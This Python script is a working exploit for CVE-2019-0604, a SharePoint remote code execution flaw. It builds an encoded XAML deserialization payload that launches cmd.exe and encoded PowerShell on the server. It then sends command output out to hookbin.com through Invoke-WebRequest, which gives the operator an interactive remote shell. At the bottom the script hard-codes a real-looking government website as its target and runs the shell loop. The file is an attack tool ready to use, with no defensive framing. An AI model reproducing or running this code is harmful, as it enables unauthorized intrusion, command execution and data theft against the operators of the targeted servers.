#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import websocket
import re
import time
import json
import base64
import string


class CVE_2019_0604:
    name = "CVE-2019-0604 SharePoint Remote Code Execution"
    description = ""
    references = []
    
    target = None
    url = None
    endpoints = [
        "/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,Microsoft.SharePoint,Version=15.0.0.0,Culture=neutral,PublicKeyToken=71e9bce111e9429c",
        "/_layouts/14/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,Microsoft.SharePoint,Version=14.0.0.0,Culture=neutral,PublicKeyToken=71e9bce111e9429c",
        "/_layouts/14/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebControls,Microsoft.SharePoint, Version=14.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c",
        "/_layouts/Picker.aspx?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,Microsoft.SharePoint,Version=14.0.0.0,Culture=neutral,PublicKeyToken=71e9bce111e9429c",
        "/_layouts/15/Picker.aspx?PickerDialogType=Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog,Microsoft.SharePoint.Portal,Version=15.0.0.0,Culture=neutral,PublicKeyToken=71e9bce111e9429c",
        "/_layouts/14/Picker.aspx?PickerDialogType=Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog,Microsoft.SharePoint.Portal,Version=14.0.0.0,Culture=neutral,PublicKeyToken=71e9bce111e9429c",
        "/_layouts/Picker.aspx?PickerDialogType=Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog,Microsoft.SharePoint.Portal,Version=14.0.0.0,Culture=neutral,PublicKeyToken=71e9bce111e9429c",
    ]

    charset = string.hexdigits[:-6]
    masks = [0xf, 0xf0, 0xf00, 0xf000]
    template = """
        53797374656d2e446174612e53657276696365732e496e7465726e616c2e457870616e6465645772617070657260325b5b53
        797374656d2e57696e646f77732e4d61726b75702e58616d6c5265616465722c2050726573656e746174696f6e4672616d65
        776f726b2c2056657273696f6e3d342e302e302e302c2043756c747572653d6e65757472616c2c205075626c69634b657954
        6f6b656e3d333162663338353661643336346533355d2c5b53797374656d2e57696e646f77732e446174612e4f626a656374
        4461746150726f76696465722c2050726573656e746174696f6e4672616d65776f726b2c2056657273696f6e3d342e302e30
        2e302c2043756c747572653d6e65757472616c2c205075626c69634b6579546f6b656e3d3331626633383536616433363465
        33355d5d2c2053797374656d2e446174612e53657276696365732c2056657273696f6e3d342e302e302e302c2043756c7475
        72653d6e65757472616c2c205075626c69634b6579546f6b656e3d623737613563353631393334653038393a3c3f786d6c20
        76657273696f6e3d22312e302220656e636f64696e673d227574662d3136223f3e3c457870616e646564577261707065724f
        6658616d6c5265616465724f626a6563744461746150726f766964657220786d6c6e733a7873693d22687474703a2f2f7777
        772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e63652220786d6c6e733a7873643d22687474703a
        2f2f7777772e77332e6f72672f323030312f584d4c536368656d61223e3c50726f6a656374656450726f7065727479303e3c
        4f626a656374496e7374616e6365207873693a747970653d2258616d6c526561646572222f3e3c4d6574686f644e616d653e
        50617273653c2f4d6574686f644e616d653e3c4d6574686f64506172616d65746572733e3c616e7954797065207873693a74
        7970653d227873643a737472696e67223e266c743b5265736f7572636544696374696f6e61727920786d6c6e733d22687474
        703a2f2f736368656d61732e6d6963726f736f66742e636f6d2f77696e66782f323030362f78616d6c2f70726573656e7461
        74696f6e2220786d6c6e733a783d22687474703a2f2f736368656d61732e6d6963726f736f66742e636f6d2f77696e66782f
        323030362f78616d6c2220786d6c6e733a53797374656d3d22636c722d6e616d6573706163653a53797374656d3b61737365
        6d626c793d6d73636f726c69622220786d6c6e733a446961673d22636c722d6e616d6573706163653a53797374656d2e4469
        61676e6f73746963733b617373656d626c793d73797374656d222667743b266c743b4f626a6563744461746150726f766964
        657220783a4b65793d224578656375746522204f626a656374547970653d227b783a5479706520446961673a50726f636573
        737d22204d6574686f644e616d653d225374617274222667743b266c743b4f626a6563744461746150726f76696465722e4d
        6574686f64506172616d65746572732667743b266c743b53797374656d3a537472696e672667743b636d642e657865266c74
        3b2f53797374656d3a537472696e672667743b266c743b53797374656d3a537472696e672667743b2f6320{}266c743b2f53
        797374656d3a537472696e672667743b266c743b2f4f626a6563744461746150726f76696465722e4d6574686f6450617261
        6d65746572732667743b266c743b2f4f626a6563744461746150726f76696465722667743b266c743b2f5265736f75726365
        44696374696f6e6172792667743b3c2f616e79547970653e3c2f4d6574686f64506172616d65746572733e3c2f50726f6a65
        6374656450726f7065727479303e3c2f457870616e646564577261707065724f6658616d6c5265616465724f626a65637444
        61746150726f76696465723e"""

    def __init__(self, target):
        self.target = target
        requests.packages.urllib3.disable_warnings()

    def encode(self, data):
        result = ""
        for c in data:
            for i in range(4):
                result += self.charset[(ord(c) & self.masks[i]) >> (i << 2 & 31)]
        return result

    def decode(self, data, index, chars_to_read):
        result = ""
        for i in range(index, index + chars_to_read, 4):
            c = 0
            for j in range(4):
                b = self.charset.index(data[i + j])
                c = c | b << (j << 2)
            result += chr(c)
        return result

    def generate_payload(self, command):
        hex_command = command.replace('>', '&gt;').replace('<', '&lt;').encode().hex() 
        payload = self.encode(bytes.fromhex(self.template.format(hex_command)).decode())
        final_payload = "__bp" + self.encode(chr(len(payload))) + payload
        return final_payload        

    def execute(self, command):
        client = requests.session()
        client.verify = False
        resp = client.get(self.url)
        html = resp.text.replace('\n', '')
        data = {}
        list_input = re.findall("<input(.*?)>", html)
        for input in list_input:
            match = re.search("name=\"(.*?)\"", input)
            if match == None: continue
            name = match.group(1)
            match = re.search("value=\"(.*?)\"", input)
            value = "" if match == None else match.group(1)
            data.update({name: value})
        ctl5 = "ctl00$PlaceHolderDialogBodySection$ctl05$"
        data.update({ctl5 + "hiddenSpanData": self.generate_payload(command)})
        data.update({ctl5 + "OriginalEntities": "<Entities />"})
        data.update({ctl5 + "downlevelTextBox": "&#160;"})
        data.update({'__CALLBACKID': "ctl00$PlaceHolderDialogBodySection$ctl07"})
        data.update({'__CALLBACKPARAM': ""})
        data.update({'__EVENTTARGET': ""})
        data.update({'__EVENTARGUMENT': ""})
        client.post(self.url, data)
        #time.sleep(10) # wait command execute

    def execute_powershell(self, command):
        encoded_command = base64.b64encode(command.encode('utf-16le'))
        self.execute("powershell -e " + str(encoded_command, 'utf-8'))

    def execute_powershell_with_output(self, command):
        hookbin = requests.session()
        try:
            hookbin.get("https://hookbin.com")
            id = hookbin.post("https://hookbin.com/bin/create",
                            data={'_csrf': hookbin.cookies['XSRF-TOKEN']}).url.split("/")[-1]
            endpoint = "https://hookb.in/" + id
            captured = "https://hookbin.com/bin/" + id
            command = 'Invoke-WebRequest -Uri ' + endpoint + \
                        ' -Method POST -Body $([bitconverter]::tostring([text.encoding]::utf8.getbytes($($(' + command + ')|out-string))).replace("-",""))'
            self.execute_powershell(command)
            resp = hookbin.get(captured, headers={'X-XSRF-TOKEN': hookbin.cookies['XSRF-TOKEN']})
            while len(resp.json()['results']) == 0:
                resp = hookbin.get(captured, headers={'X-XSRF-TOKEN': hookbin.cookies['XSRF-TOKEN']})
            result = bytearray.fromhex(list(resp.json()['results'][0]['body']['data'].keys())[0]).decode()
        except Exception as e:
            result = "Something wrong! Please try again later!"
        finally:
            hookbin.close()
            return result

    def run_powershell(self):
        while True:
            cmd = input('PS> ')
            if cmd == 'exit': break
            output = self.execute_powershell_with_output(cmd)
            print(output)
    

target_url = "https://cityoflondon.gov.uk"#input("Target: ")
target = CVE_2019_0604(target_url)
target.url = target_url + target.endpoints[1]
target.run_powershell()

